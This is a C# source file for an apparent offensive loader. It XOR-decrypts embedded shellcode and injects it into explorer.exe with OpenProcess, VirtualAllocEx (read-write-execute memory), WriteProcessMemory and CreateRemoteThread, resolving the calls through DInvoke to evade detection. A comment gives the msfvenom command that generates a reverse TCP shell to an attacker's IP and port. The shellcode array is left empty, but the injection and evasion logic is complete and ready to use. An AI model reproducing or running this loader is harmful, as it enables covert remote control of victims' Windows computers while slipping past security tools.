using DInvoke.DynamicInvoke;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace ShellcodeEvading
{
    class Program
    {
        //Function to decrypt shellcode.
        private static byte[] xor(byte[] cipher, byte[] key)
        {
            byte[] decrypted = new byte[cipher.Length];

            for (int i = 0; i < cipher.Length; i++)
            {
                decrypted[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }

            return decrypted;
        }
        static void Main(string[] args)
        {
            //msfvenom -p windows/x64/shell_reverse_tcp LHOST=attackerIP LPORT=attackerPort -f raw | xorcsharp.py
            byte[] encShellcode = new byte[] {};

            //The key used to encrypt/decrypt the shellcode
            string key = "supersecurepasskey";

            // Set the shellcode variable and assign it the decrypted shellcode.
            byte[] shellcode;

            shellcode = xor(encShellcode, Encoding.ASCII.GetBytes(key));

            //Get the processID for the first instance of explorer.exe
            Process[] targetProcess = Process.GetProcessesByName("explorer");
            Process explorerProcess = targetProcess[0];

            //Get a handle on the target process
            var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
            var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Methods.OpenProcess)) as Methods.OpenProcess;
            IntPtr process_handle = openProcess(0x1F0FFF, false, explorerProcess.Id);

            //Allocate the memory to place the shellcode
            pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            var virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Methods.VirtualAllocEx)) as Methods.VirtualAllocEx;
            IntPtr memory_allocation = virtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length), 0x00001000, 0x40);

            //Write the shellcode into memory
            IntPtr bytesWritten;
            pointer = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            var writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Methods.WriteProcessMemory)) as Methods.WriteProcessMemory;
            writeProcessMemory(process_handle, memory_allocation, shellcode, (int)shellcode.Length, out bytesWritten);

            //Execute the code
            pointer = Generic.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            var createRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Methods.CreateRemoteThread)) as Methods.CreateRemoteThread;
            createRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
    class Methods
    {
        //OpenProcess API to get handle on the target process
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        //VirtualAllocEx to allocate memory in the remote process
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        //WriteProcessMemory to copy shellcode into memory
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberofBytesWritten);

        //CreateRemoteThread to execute the shellcode in memory
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParamerter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000,
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
    }
}
